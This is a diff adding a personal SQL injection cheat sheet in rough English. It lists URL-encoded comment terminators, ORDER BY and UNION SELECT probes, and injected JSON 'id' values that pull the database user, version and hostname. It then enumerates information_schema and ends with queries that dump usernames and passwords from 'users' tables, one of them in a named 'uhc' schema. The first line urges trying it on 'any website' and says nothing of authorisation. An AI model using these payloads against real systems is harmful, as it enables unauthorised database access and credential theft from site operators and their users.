@@ -1,0 +1,105 @@
+# This is entry point sql injection always test any website
+
+ 
+##################### url encode form###############
+'  == %27
+"  == %22
+#  == %23
+;  == %3B
+)  == %29
+'-- - == %27%2d%2d%20%2d
+'--+-- 
+'--+-
+--+ 
+
+
+
+
+# if id parameter then 
+
+
+ don't use any 
+
+ ' " \ # ; only test 
+
+ use -- --+ --+- this query to balace .. 
+
+
+## 
+
+ Some Login Here 
+
+ After Controlling Sql error 
+
+ # check table in web app 
+
+  order by 1,2,3 
+
+ # another check 
+ 
+  union select 1,2,3,4 
+
+ # check good path 
+
+
+  you can put wrong id 
+
+  {"id":"23 union select 1,2,3--","secret":true}
+
+
+ # keep in mind if id parameter is available then put wrong id
+
+
+
+# grep system information 
+
+  
+{"id":"233 union select 1,2,user()--","secret":true}
+
+
+{"id":"233 union select 1,2,@@version--","secret":true}
+
+{"id":"233 union select 1,2,database()--","secret":true}
+
+@@hostname
+
+
+
+#### How to find table columns and id password 
+
+# table enumreation 
+union select 1,2,table_name FROM information_schema.tables--
+
+
+# columns enumeration 
+
+union select 1,2,column_name FROM information_schema.columns where table_name='users'
+
+# concat quary is used to extract information name username and password:
+
+ union select 1,2,concat(user,password) FROM users; 
+
+
+###### Another way to find user name and password 
+
+#################   group_concat() is used to concat multiple rows in one field
+
+### schema_name is used to find out what is using mysql or another sql server 
+
+#union select 1,2,group_concat()
+
+# 
+  union select 1,2,schema_name from information_schema.schemata-- # show all table in list 
+
+
+# 
+  union select 1,2,group_concat(schema_name) from information_schema.schemata-- # show all table in oneline
+
+
+#
+  union select 1,2,group_concat(concat(column_name)) from information_schema.columns where table_schema='uhc'--  #show all columns in list
+
+
+#  
+   union select 1,2,group_concat(concat(name,password)) from uhc.users-- 
+
